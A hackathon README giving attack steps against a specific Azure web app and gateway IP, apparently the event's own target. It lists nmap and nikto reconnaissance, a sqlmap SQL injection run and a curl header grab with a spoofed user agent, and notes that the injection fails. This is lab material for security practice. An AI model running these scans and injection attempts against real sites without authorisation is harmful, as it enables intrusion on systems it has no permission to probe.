# WebSite Attack by AndreMurrel
Web site attack created by Andre Murrel for FTA hackaton Februare 2022

This is instructions on how to execute a website attack. It was created by Andre Murrel for a hackaton played by Rudnei, Andre, Simona, Ricardo, Andrej and Andrew.

## Information utilized

- Web app: https://owaspdirect-prunoavl6xr2y.azurewebsites.net 
- App GW: 52.249.241.69

## Enumeration and Discovery
```
    Nmap -v -O -Pn 52.249.241.69 --traceroute 
    #silent scan of IP and 1000 ports if ICMP is blocked 
```
```
    nikto -h 52.249.241.69 
    //nikto -h https://owaspdirect-prunoavl6xr2y.azurewebsites.net 
    //nikto -h https://owaspdirecprunoavl6xr2y.azurewebsites.net –ssl
```
## ATTACK Attempt at SQL Injection (this throws the kitchen sink at the Website) 
```
    sqlmap -u "https://owaspdirect-prunoavl6xr2y.azurewebsites.net" --data="id=1&str=val" -b 
```
![image](https://user-images.githubusercontent.com/97529152/161347761-6c4a72d3-8c94-4d97-8c78-761c182a9f74.png)

**NOTE:**  
This will NOT be successful but will send a lot of SQL injection and XSS traffic to the WebApp. This will identity that there are NO DBs behind the WebApp.

- Grab header and spoof useragent 
```
curl -I -X HEAD -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" http://52.249.241.69
```
![image](https://user-images.githubusercontent.com/97529152/161603718-54a5655e-7c8a-476e-ad2f-bc2f111e5ae8.png)

